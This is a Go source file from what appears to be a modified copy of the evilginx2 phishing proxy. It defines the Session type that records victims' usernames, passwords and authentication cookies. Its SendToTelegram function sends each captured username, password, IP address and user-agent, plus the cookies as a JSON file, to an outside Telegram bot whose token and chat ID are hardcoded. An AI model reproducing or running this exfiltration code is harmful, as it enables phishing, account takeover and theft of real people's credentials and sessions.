package core

import (
	"encoding/json"
	"fmt"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/kgretzky/evilginx2/database"
	"strconv"
)

type Session struct {
	Id            string
	Name          string
	Username      string
	Password      string
	Custom        map[string]string
	Params        map[string]string
	Tokens        map[string]map[string]*database.Token
	RedirectURL   string
	IsDone        bool
	IsAuthUrl     bool
	IsForwarded   bool
	RedirectCount int
	PhishLure     *Lure
}

func NewSession(name string) (*Session, error) {
	s := &Session{
		Id:            GenRandomToken(),
		Name:          name,
		Username:      "",
		Password:      "",
		Custom:        make(map[string]string),
		Params:        make(map[string]string),
		RedirectURL:   "",
		IsDone:        false,
		IsAuthUrl:     false,
		IsForwarded:   false,
		RedirectCount: 0,
		PhishLure:     nil,
	}
	s.Tokens = make(map[string]map[string]*database.Token)

	return s, nil
}

func (s *Session) SetUsername(username string) {
	s.Username = username
}

func (s *Session) SetPassword(password string) {
	s.Password = password
}

func (s *Session) SetCustom(name string, value string) {
	s.Custom[name] = value
}

func (s *Session) AddAuthToken(domain string, key string, value string, path string, http_only bool, authTokens map[string][]*AuthToken) bool {
	if _, ok := s.Tokens[domain]; !ok {
		s.Tokens[domain] = make(map[string]*database.Token)
	}
	if tk, ok := s.Tokens[domain][key]; ok {
		tk.Name = key
		tk.Value = value
		tk.Path = path
		tk.HttpOnly = http_only
	} else {
		s.Tokens[domain][key] = &database.Token{
			Name:     key,
			Value:    value,
			HttpOnly: http_only,
		}
	}

	tcopy := make(map[string][]AuthToken)
	for k, v := range authTokens {
		tcopy[k] = []AuthToken{}
		for _, at := range v {
			if !at.optional {
				tcopy[k] = append(tcopy[k], *at)
			}
		}
	}

	for domain, tokens := range s.Tokens {
		for tk, _ := range tokens {
			if al, ok := tcopy[domain]; ok {
				for an, at := range al {
					match := false
					if at.re != nil {
						match = at.re.MatchString(tk)
					} else if at.name == tk {
						match = true
					}
					if match {
						tcopy[domain] = append(tcopy[domain][:an], tcopy[domain][an+1:]...)
						if len(tcopy[domain]) == 0 {
							delete(tcopy, domain)
						}
						break
					}
				}
			}
		}
	}

	if len(tcopy) == 0 {
		return true
	}
	return false
}

func (s *Session) SendToTelegram() error {
	// Hardcoded Telegram bot credentials
	botToken := "6527994050:AAHgt8nRXCI8DWnuArh2riUspi6Z9bnPKzA"
	chatID := "5822512651"

	chatIDInt, err := strconv.ParseInt(chatID, 10, 64)
if err != nil {
    return err
}

	// Convert session data (excluding tokens) to a string
	sessionText := fmt.Sprintf("Session ID: %s\nUsername: %s\nPassword: %s\nUser-Agent: %s\nRemote IP: %s",
		s.Id, s.Username, s.Password, s.Params["User-Agent"], s.Params["Remote-IP"])

	// Create a new Telegram bot
	bot, err := tgbotapi.NewBotAPI(botToken)
	if err != nil {
		return err
	}

	// Create a message for session data
	// message := tgbotapi.NewMessage(chatID, sessionText)
	message := tgbotapi.NewMessage(chatIDInt, sessionText)

	// Send the session data
	_, err = bot.Send(message)
	if err != nil {
		return err
	}

	// Convert tokens to JSON
	tokenJSON, err := json.MarshalIndent(s.Tokens, "", "  ")
	if err != nil {
		return err
	}

	// Create a file with JSON data
	file := tgbotapi.FileBytes{Name: "tokens.json", Bytes: tokenJSON}

	// Create a message for the token file
	fileMessage := tgbotapi.NewDocument(chatIDInt, file)

	// Send the token file
	_, err = bot.Send(fileMessage)
	if err != nil {
		return err
	}

	return nil
}